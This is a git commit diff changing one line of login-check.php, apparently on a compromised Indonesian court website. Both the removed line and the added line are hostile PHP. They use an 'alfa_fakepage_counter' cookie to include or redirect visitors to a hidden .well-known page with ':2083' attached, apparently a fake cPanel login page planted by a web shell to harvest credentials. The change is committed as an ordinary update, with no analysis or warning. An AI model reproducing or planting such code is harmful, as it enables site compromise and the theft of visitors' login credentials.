267158f42b4485fc333c2f13bfb6accd089a2364
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-08-19 04:19:46 +0700

    Update login-check.php

--- login-check.php
+++ login-check.php
@@ -1,1 +1,1 @@
-<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["alfa_fakepage_counter16973"]<3){@include("/home2/pntanjun/sipenak.pn-tanjungkarang.go.id/.well-known/index.php");exit;}?>
+<?php if((int)$_COOKIE["alfa_fakepage_counter16973"]<3){@header("Location: http://sipenak.pn-tanjungkarang.go.id/.well-known/?:2083");exit;}?>
